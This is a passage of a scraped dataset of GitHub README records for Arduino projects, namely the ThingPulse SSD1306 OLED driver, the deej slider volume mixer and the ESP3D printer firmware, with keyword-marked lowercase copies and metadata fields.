"Selector": "tool", "selectorShort": "tool", "MarkedSent": "thingpulse oled ssd1306 (esp8266/esp32/mbed-os)\nthis is a driver for ssd1306 128x64, 128x32, 64x48 and 64x32 oled displays running on the arduino/esp8266 & esp32 and mbed-os platforms. can be used with either the i2c or spi version of the display.\nthis library drives the oled display included in the thingpulse iot starter kit aka classic kit aka weather station kit.\nyou can either download this library as a zip file and unpack it to your arduino/libraries folder or find it in the arduino library manager under \"esp8266 and esp32 oled driver for ssd1306 display\". for mbed-os a copy of the files are available as an mbed-os library.\nit is also available as a platformio library. just execute the following command:\nplatformio lib install 2978\nservice level promise\nthis is a thingpulse prime project. see our open-source commitment declaration for what this means.\ncredits\nthis library has initially been written by daniel eichhorn. many thanks go to fabrice weinberg for optimizing and refactoring many aspects of the library. also many thanks to the many committers who helped to add new features and who fixed many bugs. mbed-os support and other improvements were contributed by helmut tschemernjak.\nthe init sequence for the ssd1306 was inspired by adafruit's library for the same display.\nmbed-os\nthis library has been adopted to support the arm mbed-os environment. a copy of this library is available in mbed-os under the name oled_ssd1306 by helmut tschemernjak. an alternate installation option is to copy the following files into your mbed-os project: oleddisplay.cpp oleddisplay.h oleddisplayfonts.h oleddisplayui.cpp oleddisplayui.h ssd1306i2c.h\nusage\ncheck out the examples folder for a few comprehensive demonstrations how to use the library. also check out the esp8266 weather station library which uses the oled library to display beautiful weather information.\nupgrade\nthe api changed a lot with the 3.0 release. if you were using this library with older versions please have a look at the upgrade guide.\ngoing from 3.x version to 4.0 a lot of internals changed and compatibility for more displays was added. please read the upgrade guide.\nfeatures\ndraw pixels at given coordinates\ndraw lines from given coordinates to given coordinates\ndraw or fill a rectangle with given dimensions\ndraw text at given coordinates:\ndefine alignment: left, right and center\nset the fontface you want to use (see section fonts below)\nlimit the width of the text by an amount of pixels. before this widths will be reached, the renderer will wrap the text to a new line if possible\ndisplay content in automatically side scrolling carousel\ndefine transition cycles\ndefine how long one frame will be displayed\ndraw the different frames in callback methods\none indicator per frame will be automatically displayed. the active frame will be displayed from inactive once\nfonts\nfonts are defined in a proprietary but open format. you can create new font files by choosing from a given list of open sourced fonts from this web app: http://oleddisplay.squix.ch choose the font family, style and size, check the preview image and if you like what you see click the \"create\" button. this will create the font array in a text area form where you can copy and paste it into a new or existing header file.\nhardware abstraction\nthe library supports different protocols to access the oled display. currently there is support for i2c using the built in wire.h library, i2c by using the much faster brzo i2c library written in assembler and it also supports displays which come with the spi interface.\ni2c with wire.h\n#include <wire.h>\n#include \"ssd1306wire.h\"\n// for 128x64 displays:\nssd1306wire display(0x3c, sda, scl); // address, sda, scl\n// for 128x32 displays:\n// ssd1306wire display(0x3c, sda, scl, geometry_128_32); // address, sda, scl, geometry_128_32 (or 128_64)\n// for using 2nd hardware i2c (if available)\n// ssd1306wire(0x3c, sda, scl, geometry_128_64, i2c_two); //default value is i2c_one if not mentioned\n// by default sd1306wire set i2c frequency to 700000, you can use set either another frequency or skip setting the frequency by providing -1 value\n// ssd1306wire(0x3c, sda, scl, geometry_128_64, i2c_one, 400000); //set i2c frequency to 400khz\n// ssd1306wire(0x3c, sda, scl, geometry_128_64, i2c_one, -1); //skip setting the i2c bus frequency\nfor a sh1106:\n#include <wire.h>\n#include \"sh1106wire.h\"\nsh1106wire display(0x3c, sda, scl); // address, sda, scl\n// by default sh1106wire set i2c frequency to 700000, you can use set either another frequency or skip setting the frequency by providing -1 value\n// sh1106wire(0x3c, sda, scl, geometry_128_64, i2c_one, 400000); //set i2c frequency to 400khz\n// sh1106wire(0x3c, sda, scl, geometry_128_64, i2c_one, -1); //skip setting the i2c bus frequency\ni2c with brzo_i2c\n#include <brzo_i2c.h>\n#include \"ssd1306brzo.h\"\nssd1306brzo display(0x3c, sda, scl); // address, sda, scl\nor for the sh1106:\n#include <brzo_i2c.h>\n#include \"sh1106brzo.h\"\nsh1106brzo display(0x3c, sda, scl); // address, sda, scl\nspi\n#include <spi.h>\n#include \"ssd1306spi.h\"\nssd1306spi display(d0, d2, d8); // res, dc, cs\nor for the sh1106:\n#include <spi.h>\n#include \"sh1106spi.h\"\nsh1106spi display(d0, d2); // res, dc\napi\ndisplay control\n// initialize the display\nvoid init();\n// free the memory used by the display\nvoid end();\n// cycle through the initialization\nvoid resetdisplay(void);\n// connect again to the display through i2c\nvoid reconnect(void);\n// turn the display on\nvoid displayon(void);\n// turn the display offs\nvoid displayoff(void);\n// clear the local pixel buffer\nvoid clear(void);\n// write the buffer to the display memory\nvoid display(void);\n// inverted display mode\nvoid invertdisplay(void);\n// normal display mode\nvoid normaldisplay(void);\n// set display contrast\n// really low brightness & contrast: contrast = 10, precharge = 5, comdetect = 0\n// normal brightness & contrast: contrast = 100\nvoid setcontrast(uint8_t contrast, uint8_t precharge = 241, uint8_t comdetect = 64);\n// convenience method to access\nvoid setbrightness(uint8_t);\n// turn the display upside down\nvoid flipscreenvertically();\n// draw the screen mirrored\nvoid mirrorscreen();\npixel drawing\n/* drawing functions */\n// sets the color of all pixel operations\n// color : black, white, inverse\nvoid setcolor(oleddisplay_color color);\n// draw a pixel at given position\nvoid setpixel(int16_t x, int16_t y);\n// draw a line from position 0 to position 1\nvoid drawline(int16_t x0, int16_t y0, int16_t x1, int16_t y1);\n// draw the border of a rectangle at the given location\nvoid drawrect(int16_t x, int16_t y, int16_t width, int16_t height);\n// fill the rectangle\nvoid fillrect(int16_t x, int16_t y, int16_t width, int16_t height);\n// draw the border of a circle\nvoid drawcircle(int16_t x, int16_t y, int16_t radius);\n// fill circle\nvoid fillcircle(int16_t x, int16_t y, int16_t radius);\n// draw an empty triangle i.e. only the outline\nvoid drawtriangle(int16_t x0, int16_t y0, int16_t x1, int16_t y1, int16_t x2, int16_t y2);\n// draw a solid triangle i.e. filled\nvoid filltriangle(int16_t x0, int16_t y0, int16_t x1, int16_t y1, int16_t x2, int16_t y2);\n// draw a line horizontally\nvoid drawhorizontalline(int16_t x, int16_t y, int16_t length);\n// draw a lin vertically\nvoid drawverticalline(int16_t x, int16_t y, int16_t length);\n// draws a rounded progress bar with the outer dimensions given by width and height. progress is\n// a unsigned byte value between 0 and 100\nvoid drawprogressbar(uint16_t x, uint16_t y, uint16_t width, uint16_t height, uint8_t progress);\n// draw a bitmap in the internal image format\nvoid drawfastimage(int16_t x, int16_t y, int16_t width, int16_t height, const uint8_t *image);\n// draw a xbm\nvoid drawxbm(int16_t x, int16_t y, int16_t width, int16_t height, const uint8_t *xbm);\ntext operations\nvoid drawstring(int16_t x, int16_t y, const string &text);\n// draws a string with a maximum width at the given location.\n// if the given string is wider than the specified width\n// the text will be wrapped to the next line at a space or dash\nvoid drawstringmaxwidth(int16_t x, int16_t y, int16_t maxlinewidth, const string &text);\n// returns the width of the const char* with the current\n// font settings\nuint16_t getstringwidth(const char* text, uint16_t length);\n// convencience method for the const char version\nuint16_t getstringwidth(const string &text);\n// specifies relative to which anchor point\n// the text is rendered. available constants:\n// text_align_left, text_align_center, text_align_right, text_align_center_both\nvoid settextalignment(oleddisplay_text_alignment textalignment);\n// sets the current font. available default fonts\n// arialmt_plain_10, arialmt_plain_16, arialmt_plain_24\n// or create one with the font -----> tool !!!  at http://oleddisplay.squix.ch\nvoid setfont(const uint8_t* fontdata);\nui library (oleddisplayui)\nthe ui library is used to provide a basic set of user interface elements called frames and overlays. a frame is used to provide information to the user. the default behaviour is to display a frame for a defined time and than move to the next frame. the library also provides an indicator element that will be updated accordingly. an overlay on the other hand is a piece of information (e.g. a clock) that is always displayed at the same position.\n/**\n* initialise the display\n*/\nvoid init();\n/**\n* configure the internal used target fps\n*/\nvoid settargetfps(uint8_t fps);\n/**\n* enable automatic transition to next frame after the some time can be configured with\n* `settimeperframe` and `settimepertransition`.\n*/\nvoid enableautotransition();\n/**\n* disable automatic transition to next frame.\n*/\nvoid disableautotransition();\n/**\n* set the direction if the automatic transitioning\n*/\nvoid setautotransitionforwards();\nvoid setautotransitionbackwards();\n/**\n* set the approx. time a frame is displayed\n*/\nvoid settimeperframe(uint16_t time);\n/**\n* set the approx. time a transition will take\n*/\nvoid settimepertransition(uint16_t time);\n/**\n* draw the indicator.\n* this is the default state for all frames if\n* the indicator was hidden on the previous frame\n* it will be slided in.\n*/\nvoid enableindicator();\n/**\n* don't draw the indicator.\n* this will slide out the indicator\n* when transitioning to the next frame.\n*/\nvoid disableindicator();\n/**\n* enable drawing of all indicators.\n*/\nvoid enableallindicators();\n/**\n* disable drawing of all indicators.\n*/\nvoid disableallindicators();\n/**\n* set the position of the indicator bar.\n*/\nvoid setindicatorposition(indicatorposition pos);\n/**\n* set the direction of the indicator bar. defining the order of frames ascending / descending\n*/\nvoid setindicatordirection(indicatordirection dir);\n/**\n* set the symbol to indicate an active frame in the indicator bar.\n*/\nvoid setactivesymbol(const uint8_t* symbol);\n/**\n* set the symbol to indicate an inactive frame in the indicator bar.\n*/\nvoid setinactivesymbol(const uint8_t* symbol);\n/**\n* configure what animation is used to transition from one frame to another\n*/\nvoid setframeanimation(animationdirection dir);\n/**\n* add frame drawing functions\n*/\nvoid setframes(framecallback* framefunctions, uint8_t framecount);\n/**\n* add overlays drawing functions that are draw independent of the frames\n*/\nvoid setoverlays(overlaycallback* overlayfunctions, uint8_t overlaycount);\n/**\n* set the function that will draw each step\n* in the loading animation\n*/\nvoid setloadingdrawfunction(loadingdrawfunction loadingdrawfunction);\n/**\n* run the loading process\n*/\nvoid runloadingprocess(loadingstage* stages, uint8_t stagescount);\n// manual control\nvoid nextframe();\nvoid previousframe();\n/**\n* switch without transition to frame `frame`.\n*/\nvoid switchtoframe(uint8_t frame);\n/**\n* transition to frame `frame`. when the `frame` number is bigger than the current\n* frame the forward animation will be used, otherwise the backwards animation is used.\n*/\nvoid transitiontoframe(uint8_t frame);\n// state info\noleddisplayuistate* getuistate();\n// this needs to be called in the main loop\n// the returned value is the remaining time (in ms)\n// you have to draw after drawing to keep the frame budget.\nint8_t update();\nexample: ssd1306demo\nframe 1\nthis frame shows three things:\nhow to draw an xmb image\nhow to draw static text which is not moved by the frame transition\nthe active/inactive frame indicators\nframe 2\ncurrently there are one fontface with three sizes included in the library: arial 10, 16 and 24. once the converter is published you will be able to convert any ttf font into the used format.\nframe 3\nthis frame demonstrates the text alignment. the coordinates in the frame show relative to which position the texts have been rendered.\nframe 4\nthis shows how to use define a maximum width after which the driver automatically wraps a word to the next line. this comes in very handy if you have longer texts to display.\nspi version\nthis shows the code working on the spi version of the display. see demo code for esp8266 pins used.\nselection of projects using this library\nqrcode esp8266 (by @anunpanya)\nscan i2c (by @hallard)\nthingpulse weather station\nmeshtastic - an open source gps communicator mesh radio\nyours?", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000028, "year": null}, {"Unnamed: 0": 2078, "autor": 38, "date": null, "content": "deej\ndeej is an open-source hardware volume mixer for Windows and Linux PCs. It lets you use real-life sliders (like a DJ!) to seamlessly control the volumes of different apps (such as your music player, the game you're playing and your voice chat session) without having to stop what you're doing.\nJoin the deej Discord server if you need help or have any questions!\nNew: work-in-progress deej FAQ!\ndeej consists of a lightweight desktop client written in Go, and an Arduino-based hardware setup that's simple and cheap to build. Check out some versions built by members of our community!\nDownload the latest release | Video demonstration | Build video by Tech Always\nPsst! No 3D printer? No problem! You can build deej on some cardboard, a shoebox or even a breadboard :)\nTable of contents\nFeatures\nHow it works\nHardware\nSchematic\nSoftware\nSlider mapping (configuration)\nBuild your own!\nFAQ\nBuild video\nBill of Materials\nThingiverse collection\nBuild procedure\nHow to run\nRequirements\nDownload and installation\nBuilding from source\nCommunity\nLicense\nFeatures\ndeej is written in Go and distributed as a portable (no installer needed) executable.\nBind apps to different sliders\nBind multiple apps per slider (i.e. one slider for all your games)\nBind the master channel\nBind \"system sounds\" (on Windows)\nBind specific audio devices by name (on Windows)\nBind currently active app (on Windows)\nBind all other unassigned apps\nControl your microphone's input level\nLightweight desktop client, consuming around 10MB of memory\nRuns from your system tray\nHelpful notifications to let you know if something isn't working\nLooking for the older Python version? It's no longer maintained, but you can always find it in the legacy-python branch.\nHow it works\nHardware\nThe sliders are connected to 5 (or as many as you like) analog pins on an Arduino Nano/Uno board. They're powered from the board's 5V output (see schematic)\nThe board connects via a USB cable to the PC\nSchematic\nSoftware\nThe code running on the Arduino board is a C program constantly writing current slider values over its serial interface\nThe PC runs a lightweight Go client in the background. This client reads the serial stream and adjusts app volumes according to the given configuration file\nSlider mapping (configuration)\ndeej uses a simple YAML-formatted configuration file named config.yaml, placed alongside the deej executable.\nThe config file determines which applications (and devices) are mapped to which sliders, and which parameters to use for the connection to the Arduino board, as well as other user preferences.\nThis file auto-reloads when its contents are changed, so you can change application mappings on-the-fly without restarting deej.\nIt looks like this:\nslider_mapping:\n0: master\n1: chrome.exe\n2: spotify.exe\n3:\n- pathofexile_x64.exe\n- rocketleague.exe\n4: discord.exe\n# set this to true if you want the controls inverted (i.e. top is 0%, bottom is 100%)\ninvert_sliders: false\n# settings for connecting to the arduino board\ncom_port: COM4\nbaud_rate: 9600\n# adjust the amount of signal noise reduction depending on your hardware quality\n# supported values are \"low\" (excellent hardware), \"default\" (regular hardware) or \"high\" (bad, noisy hardware)\nnoise_reduction: default\nmaster is a special option to control the master volume of the system (uses the default playback device)\nmic is a special option to control your microphone's input level (uses the default recording device)\ndeej.unmapped is a special option to control all apps that aren't bound to any slider (\"everything else\")\nOn Windows, deej.current is a special option to control whichever app is currently in focus\nOn Windows, you can specify a device's full name, i.e. Speakers (Realtek High Definition Audio), to bind that device's level to a slider. This doesn't conflict with the default master and mic options, and works for both input and output devices.\nBe sure to use the full device name, as seen in the menu that comes up when left-clicking the speaker icon in the tray menu\nsystem is a special option on Windows to control the \"System sounds\" volume in the Windows mixer\nAll names are case-insensitive, meaning both chrome.exe and CHROME.exe will work\nYou can create groups of process names (using a list) to either:\ncontrol more than one app with a single slider\nchoose whichever process in the group that's currently running (i.e. to have one slider control any game you're playing)\nBuild your own!\nBuilding deej is very simple. You only need a few relatively cheap parts - it's an excellent starter project (and my first Arduino project, personally). Remember that if you need any help or have a question that's not answered here, you can always join the deej Discord server.\nBuild deej for yourself, or as an awesome gift for your gaming buddies!\nFAQ\nI've started a highly focused effort of writing a proper FAQ page for deej, covering many basic and advanced topics.\nIt is still very much a work-in-progress, but I'm happy to share it in its current state in hopes that it at least covers some questions you might have.\nFAQ feedback in our community Discord is strongly encouraged :)\nBuild video\nIn case you prefer watching to reading, Charles from the Tech Always YouTube channel has made a fantastic video that covers the basics of building deej for yourself, including parts, costs, assembly and software. I highly recommend checking it out!\nBill of Materials\nAn Arduino Nano, Pro Micro or Uno board\nI officially recommend using a Nano or a Pro Micro for their smaller form-factor, friendlier USB connectors and more analog pins. Plus they're cheaper\nYou can also use any other development board that has a Serial over USB interface\nA few slider potentiometers, up to your number of free analog pins (the cheaper ones cost around 1-2 USD each, and come with a standard 10K Ohm variable resistor. These should work just fine for this project)\nImportant: make sure to get linear sliders, not logarithmic ones! Check the product description\nYou can also use circular knobs if you like\nSome wires\nAny kind of box to hold everything together. You don't need a 3D printer for this project! It works fantastically with just a piece of cardboard or a shoebox. That being said, if you do have one, read on...\nThingiverse collection\nWith many different 3D-printed designs being added to our community showcase, it felt right to gather all of them in a Thingiverse collection for you to browse. If you have access to a 3D printer, feel free to use one of the designs in your build.\nVisit our community-created design collection on Thingiverse!\nYou can also submit your own design to be added to the collection. Regardless, if you do upload your design to Thingiverse, please add a deej tag to it so that others can find it more easily.\nBuild procedure\nConnect everything according to the schematic\nTest with a multimeter to be sure your sliders are hooked up correctly\nFlash the Arduino chip with the sketch in arduino\\deej-5-sliders-vanilla\nImportant: If you have more or less than 5 sliders, you must edit the sketch to match what you have\nAfter flashing, check the serial monitor. You should see a constant stream of values separated by a pipe (|) character, e.g. 0|240|1023|0|483\nWhen you move a slider, its corresponding value should move between 0 and 1023\nCongratulations, you're now ready to run the deej executable!\nHow to run\nRequirements\nWindows\nWindows. That's it\nLinux\nInstall libgtk-3-dev, libappindicator3-dev and libwebkit2gtk-4.0-dev for system tray support. Pre-built Linux binaries aren't currently released, so you'll need to build from source. If there's demand for pre-built binaries, please let me know!\nDownload and installation\nHead over to the releases page and download the latest version's executable and configuration file (deej.exe and config.yaml)\nPlace them in the same directory anywhere on your machine\n(Optional, on Windows) Create a shortcut to deej.exe and copy it to %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup to have deej run on boot\nBuilding from source\nIf you'd rather not download a compiled executable, or want to extend deej or modify it to your needs, feel free to clone the repository and build it yourself. All you need is a Go 1.14 (or above) environment on your machine. If you go this route, make sure to check out the developer scripts.\nLike other Go packages, you can also use the go get tool: go get -u github.com/omriharel/deej. Please note that the package code now resides in the pkg/deej directory, and needs to be imported from there if used inside another project.\nIf you need any help with this, please join our Discord server.\nCommunity\ndeej is a relatively new project, but a vibrant and awesome community is rapidly growing around it. Come hang out with us in the deej Discord server, or check out a whole bunch of cool and creative builds made by our members in the community showcase.\nThe server is also a great place to ask questions, suggest features or report bugs (but of course, feel free to use GitHub if you prefer).\nDonations\nIf you love deej and want to show your support for this project, you can do so using the link below. Please don't feel obligated to donate - building the project and telling your friends about it goes a very long way! Thank you very much.\nContributing\nPlease see docs/CONTRIBUTING.md.\nLicense\ndeej is released under the MIT license.", "link": "https://github.com/omriharel/deej", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "deej\ndeej is an open-source hardware volume mixer for windows and linux pcs. it lets you use real-life sliders (like a dj!) to seamlessly control the volumes of different apps (such as your music player, the game you're playing and your voice chat session) without having to stop what you're doing.\njoin the deej discord server if you need help or have any questions!\nnew: work-in-progress deej faq!\ndeej consists of a lightweight desktop client written in go, and an arduino-based hardware setup that's simple and cheap to build. check out some versions built by members of our community!\ndownload the latest release | video demonstration | build video by tech always\npsst! no 3d printer? no problem! you can build deej on some cardboard, a shoebox or even a breadboard :)\ntable of contents\nfeatures\nhow it works\nhardware\nschematic\nsoftware\nslider mapping (configuration)\nbuild your own!\nfaq\nbuild video\nbill of materials\nthingiverse collection\nbuild procedure\nhow to run\nrequirements\ndownload and installation\nbuilding from source\ncommunity\nlicense\nfeatures\ndeej is written in go and distributed as a portable (no installer needed) executable.\nbind apps to different sliders\nbind multiple apps per slider (i.e. one slider for all your games)\nbind the master channel\nbind \"system sounds\" (on windows)\nbind specific audio devices by name (on windows)\nbind currently active app (on windows)\nbind all other unassigned apps\ncontrol your microphone's input level\nlightweight desktop client, consuming around 10mb of memory\nruns from your system tray\nhelpful notifications to let you know if something isn't working\nlooking for the older python version? it's no longer maintained, but you can always find it in the legacy-python branch.\nhow it works\nhardware\nthe sliders are connected to 5 (or as many as you like) analog pins on an arduino nano/uno board. they're powered from the board's 5v output (see schematic)\nthe board connects via a usb cable to the pc\nschematic\nsoftware\nthe code running on the arduino board is a c program constantly writing current slider values over its serial interface\nthe pc runs a lightweight go client in the background. this client reads the serial stream and adjusts app volumes according to the given configuration file\nslider mapping (configuration)\ndeej uses a simple yaml-formatted configuration file named config.yaml, placed alongside the deej executable.\nthe config file determines which applications (and devices) are mapped to which sliders, and which parameters to use for the connection to the arduino board, as well as other user preferences.\nthis file auto-reloads when its contents are changed, so you can change application mappings on-the-fly without restarting deej.\nit looks like this:\nslider_mapping:\n0: master\n1: chrome.exe\n2: spotify.exe\n3:\n- pathofexile_x64.exe\n- rocketleague.exe\n4: discord.exe\n# set this to true if you want the controls inverted (i.e. top is 0%, bottom is 100%)\ninvert_sliders: false\n# settings for connecting to the arduino board\ncom_port: com4\nbaud_rate: 9600\n# adjust the amount of signal noise reduction depending on your hardware quality\n# supported values are \"low\" (excellent hardware), \"default\" (regular hardware) or \"high\" (bad, noisy hardware)\nnoise_reduction: default\nmaster is a special option to control the master volume of the system (uses the default playback device)\nmic is a special option to control your microphone's input level (uses the default recording device)\ndeej.unmapped is a special option to control all apps that aren't bound to any slider (\"everything else\")\non windows, deej.current is a special option to control whichever app is currently in focus\non windows, you can specify a device's full name, i.e. speakers (realtek high definition audio), to bind that device's level to a slider. this doesn't conflict with the default master and mic options, and works for both input and output devices.\nbe sure to use the full device name, as seen in the menu that comes up when left-clicking the speaker icon in the tray menu\nsystem is a special option on windows to control the \"system sounds\" volume in the windows mixer\nall names are case-insensitive, meaning both chrome.exe and chrome.exe will work\nyou can create groups of process names (using a list) to either:\ncontrol more than one app with a single slider\nchoose whichever process in the group that's currently running (i.e. to have one slider control any game you're playing)\nbuild your own!\nbuilding deej is very simple. you only need a few relatively cheap parts - it's an excellent starter project (and my first arduino project, personally). remember that if you need any help or have a question that's not answered here, you can always join the deej discord server.\nbuild deej for yourself, or as an awesome gift for your gaming buddies!\nfaq\ni've started a highly focused effort of writing a proper faq page for deej, covering many basic and advanced topics.\nit is still very much a work-in-progress, but i'm happy to share it in its current state in hopes that it at least covers some questions you might have.\nfaq feedback in our community discord is strongly encouraged :)\nbuild video\nin case you prefer watching to reading, charles from the tech always youtube channel has made a fantastic video that covers the basics of building deej for yourself, including parts, costs, assembly and software. i highly recommend checking it out!\nbill of materials\nan arduino nano, pro micro or uno board\ni officially recommend using a nano or a pro micro for their smaller form-factor, friendlier usb connectors and more analog pins. plus they're cheaper\nyou can also use any other development board that has a serial over usb interface\na few slider potentiometers, up to your number of free analog pins (the cheaper ones cost around 1-2 usd each, and come with a standard 10k ohm variable resistor. these should work just fine for this project)\nimportant: make sure to get linear sliders, not logarithmic ones! check the product description\nyou can also use circular knobs if you like\nsome wires\nany kind of box to hold everything together. you don't need a 3d printer for this project! it works fantastically with just a piece of cardboard or a shoebox. that being said, if you do have one, read on...\nthingiverse collection\nwith many different 3d-printed designs being added to our community showcase, it felt right to gather all of them in a thingiverse collection for you to browse. if you have access to a 3d printer, feel free to use one of the designs in your build.\nvisit our community-created design collection on thingiverse!\nyou can also submit your own design to be added to the collection. regardless, if you do upload your design to thingiverse, please add a deej tag to it so that others can find it more easily.\nbuild procedure\nconnect everything according to the schematic\ntest with a multimeter to be sure your sliders are hooked up correctly\nflash the arduino chip with the sketch in arduino\\deej-5-sliders-vanilla\nimportant: if you have more or less than 5 sliders, you must edit the sketch to match what you have\nafter flashing, check the serial monitor. you should see a constant stream of values separated by a pipe (|) character, e.g. 0|240|1023|0|483\nwhen you move a slider, its corresponding value should move between 0 and 1023\ncongratulations, you're now ready to run the deej executable!\nhow to run\nrequirements\nwindows\nwindows. that's it\nlinux\ninstall libgtk-3-dev, libappindicator3-dev and libwebkit2gtk-4.0-dev for system tray support. pre-built linux binaries aren't currently released, so you'll need to build from source. if there's demand for pre-built binaries, please let me know!\ndownload and installation\nhead over to the releases page and download the latest version's executable and configuration file (deej.exe and config.yaml)\nplace them in the same directory anywhere on your machine\n(optional, on windows) create a shortcut to deej.exe and copy it to %appdata%\\microsoft\\windows\\start menu\\programs\\startup to have deej run on boot\nbuilding from source\nif you'd rather not download a compiled executable, or want to extend deej or modify it to your needs, feel free to clone the repository and build it yourself. all you need is a go 1.14 (or above) environment on your machine. if you go this route, make sure to check out the developer scripts.\nlike other go packages, you can also use the go get -----> tool !!! : go get -u github.com/omriharel/deej. please note that the package code now resides in the pkg/deej directory, and needs to be imported from there if used inside another project.\nif you need any help with this, please join our discord server.\ncommunity\ndeej is a relatively new project, but a vibrant and awesome community is rapidly growing around it. come hang out with us in the deej discord server, or check out a whole bunch of cool and creative builds made by our members in the community showcase.\nthe server is also a great place to ask questions, suggest features or report bugs (but of course, feel free to use github if you prefer).\ndonations\nif you love deej and want to show your support for this project, you can do so using the link below. please don't feel obligated to donate - building the project and telling your friends about it goes a very long way! thank you very much.\ncontributing\nplease see docs/contributing.md.\nlicense\ndeej is released under the mit license.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000038, "year": null}, {"Unnamed: 0": 2079, "autor": 39, "date": null, "content": "Firmware for ESP8266/ESP8285 and ESP32 used with 3D printer\nLatest stable release\nplease use Arduino ide 1.8.9+ with or\nLatest development version\nplease use Arduino ide 1.8.9+ with or\nAll releases\nThis firmware allows not only to have a cheap bridge between Wifi and serial, but also to have a web UI to configure wifi, to monitor 3D printer and even control it, and to make things easy, UI is fully customizable without reflashing FW.\nFirmware should work with any 3D printer firmware (repetier/marlin/smoothieware using GCODE) if serial connection has a correct setup. I currently use it with my personnal flavor of repetier for Due based boards.\nThe web interface files are present in data directory but UI has it's own repository ESP3D-WEBUI.\nBe aware ESP3D-WEBUI is for firmware 0.9.99 minimum - previous released version use tpl files which are no more used.\nNote for ESP8266 1MB flash : FW is now too big will all features you need to chose strip the FW and select only some features, also WebUI is now also too big for full multilanguage support to fit the 128K SPIFFS so please use pack with limited language (en +another) https://github.com/luc-github/ESP3D-WEBUI/tree/2.1/languages\nSponsors\nSupporters\nBecome a sponsor or a supporter\nA sponsor is a recurent donator\nThe github sponsors are automaticaly displayed by github, if your tier is A big hug or more, to thank you for your support, your logo / avatar will be also added to the readme page with eventually with a link to your site.\nA supporter is per time donator\nIf your donation is over a per year sponsor tier A big hug, to thank you for your support, your logo / avatar will be added to the readme page with eventually with a link to your site.\nEvery support is welcome, giving support/ developing new features need time and devices, donations contribute a lot to make things happen, thank you.\nFeatures\nSerial/Wifi bridge using configurable port 8888\nUse GPIO2 to ground to reset all settings in hard way - 2-6 sec after boot / not before!! Set GPIO2 to ground before boot change boot mode and go to special boot that do not reach FW. Currently boot take 10 sec - giving 8 seconds to connect GPIO2 to GND and do a hard recovery for settings\nComplete configuration by web browser (Station or Access point) or by Serial/telnet commands\nAuthentication (optional) for better security\nUpdate firmware by web browser\nCaptive portal in Access point mode which redirect all unknow call to main page\nmDNS which allows to key the name defined in web browser and connect only with bonjour installed on computer\nSSDP, this feature is a discovery protocol, supported on Windows out of the box\nFail safe mode (Access point)is enabled if cannot connect to defined station at boot.\nEmbedded FS uploader and updater.\nOLED screen support\nNotifications using Line / Pushover / email\nThe web ui add even more feature : https://github.com/luc-github/ESP3D-WEBUI/blob/2.1/README.md#features\nDefault Configuration\nDefault Settings:\nAccess Point: ESP3D\nPW:12345678\nAuthentification: WPA\nIP: 192.168.0.1\nBaud rate: 115200\nWeb port:80\nData port: 8888\nif Authentication is enabled :\nUser: admin\nPassword: admin\nUser:user\nPassword: user\nDirect commands:\nCheck wiki : https://github.com/luc-github/ESP3D/wiki/Direct-ESP3D-commands\nInstallation\nFeedback on 2.0 was : ESP3D being a library is not really useful and make setup more complex, so now we are back to simple application.\nIf you haven't already set up Arduino IDE for ESPs then do so for ESP8266 or ESP32 core version.\nDownload the latest release and manually copy the libraries present in the ESP3D-x.y.z/libraries directory into your Arduino/libraries directory. (no need if using platformIO). These versions are verified to work with ESP3D, any others (newer version) may cause untested behavior.\nUse webserver support (recommended as stable), asyncwebserver support is no longer stable on ESP3D\narduinoWebSockets from @Links2004\nGeneric ones:\nSpecific for ESP32\nESP32SSDP If you want OLED support:\noled-ssd1306 from @squix78\nIf you want DHT11/22 support:\nDHT_sensor_library_for_ESPx from @beegee-tokyo\nCompile project esp3d.ino according target: ESP8266 board or ESP32 board, please review config.h to enable disable a feature, by default athentication is disabled and most others are enabled.\nfor ESP8266 set CPU freq to 160MHz for better (https://github.com/luc-github/ESP3D/wiki/Install-Instructions)\nUpload the data content on ESP3D file system\nUsing SPIFFS uploader, this plugin and install instructions is available on each ESP core - please refere to it or\nUsing embedded uploader (you may need to format SPIFFS using : [ESP710]FORMAT on ESP8266 first)\nif embedded uploader does not show up you can force it ti display using : http://your_IP_address?forcefallback=yes\nUpdate\nGenerate a binary using the export binary menu from Arduino IDE and upload it using ESP-WEBUI or embedded interface\n\u26a0\ufe0fDo not flash your Printer fw with ESP connected on Serial - it bring troubles, at least on DaVinci, but no issue if you update using web UI\nContribution/customization\nTo style the code before pushing PR please use astyle --style=otbs *.h *.cpp *.ino\nThe embedded page is created using nodejs then gulp to generate a compressed html page (tool.html.gz), all necessary modules will be installed using the build.bat, you also need bin2c tool (https://sourceforge.net/projects/bin2c/) to generate the h file from the binary, installation and build is done using the build.bat.\nThe corresponding UI is located here\nAn optional UI was development using old repetier UI - check [UI\\repetier\\testui.htm] (https://raw.githubusercontent.com/wiki/luc-github/ESP3D/UI/repetier/testui.htm) file\nNeed more information about supported boards or wiring ?\nCheck the wiki\n\u2753Any question ?\nCheck Wiki or Join the chat at\n\u2757Any issue/feedback ?\nCheck Wiki and FAQ If you still have issue: submit ticket\nIf it is not an issue join discussion here\nESP3D is used by :\nOpensource version is used by various boards like : https://www.aliexpress.com/wholesale?SearchText=esp3d&opensearch=true&switch_new_app=y and https://youtu.be/XoWW0aU6DGE?t=76\nThis is for information only - I am not linked to these products, it is just a search result of a query using ESP3D as keyword. So I am not responsible of any usage of them.\nCustom version (not this repository) is used on azteeg mini wifi : http://www.panucatt.com/azteeg_X5_mini_reprap_3d_printer_controller_p/ax5mini.htm\nand Wifi boards for 3D printers : https://www.panucatt.com/ProductDetails.asp?ProductCode=WB8266,\n\u26a0\ufe0f Do not use this repository for boards using custom firmware, you will lose several features.\nMore to come...\n\ud83d\udc4dThanks\nto @disneysw for bringing this module idea\nto @lkarlslund for suggestion about independent reset using GPIO2\nto Roy Cortes from http://www.panucatt.com for supporting and pushing me implementing great features\nto all contributors, feedbacks owners and donations.\nIf you use ESP3D on your product, drop me a message so I can link your product page here.", "link": "https://github.com/luc-github/ESP3D", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "firmware for esp8266/esp8285 and esp32 used with 3d printer\nlatest stable release\nplease use arduino ide 1.8.9+ with or\nlatest development version\nplease use arduino ide 1.8.9+ with or\nall releases\nthis firmware allows 